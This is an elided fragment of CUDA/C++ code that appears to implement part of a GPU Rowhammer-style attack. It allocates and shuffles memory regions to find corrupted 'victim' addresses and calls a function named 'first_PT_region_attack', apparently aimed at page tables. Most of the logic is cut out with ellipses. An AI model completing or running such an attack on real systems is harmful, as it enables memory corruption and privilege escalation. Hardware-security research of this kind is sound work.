                        ...
                        uint64_t *out_victim_id)
{
  ...
  uint64_t corrupt_id, repeats = 0,
                       max_mem_alloc = num_alloc_init - agg_ptrs.size () - 4;
  uint8_t *temp_addr, *corrupted_addr, *victim_addr;
  uint8_t **region_ptrs
      = (uint8_t **)calloc (max_mem_alloc * sizeof (uint8_t *), 1);
  ...
  while (!found_mismatch)
    {
      ...
      if (repeats != 0)
        std::shuffle(region_ptrs, region_ptrs + max_mem_alloc, rng);
      for (uint64_t i = 0; i < max_mem_alloc; i += 1)
        {
          if (repeats != 0)
      ...
      gpuErrchk (cudaPeekAtLastError ());
      for (uint64_t i = 0; !found_mismatch && i < max_mem_alloc; i += 1)
        {
                        ...
                        uint64_t *out_victim_id)
{
  ...
  return first_PT_region_attack (
      num_alloc_init, threshold, skip, out_region_ptrs, out_agg_ptr,
